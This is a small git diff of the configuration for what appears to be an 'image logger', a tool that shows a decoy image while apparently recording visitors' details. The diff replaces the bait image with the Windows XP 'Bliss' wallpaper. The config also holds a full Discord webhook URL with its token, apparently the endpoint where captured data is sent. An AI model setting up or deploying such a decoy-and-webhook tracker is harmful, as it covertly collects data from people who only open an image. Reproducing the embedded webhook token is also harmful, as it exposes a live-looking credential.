@@ -15,7 +15,7 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1448805048711643329/O-NHDT28fQLcs7TlUDn-Dw358BZKR6U5XdG1TfgJmK5WE7wiw4XsoyHAq879x7rEGHjt",
-    "image": "http://images.steamusercontent.com/ugc/2206262366727932367/C0DE1573031AF35B0B2596D4F1492E4FE75828C0/?imw=637&imh=358&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
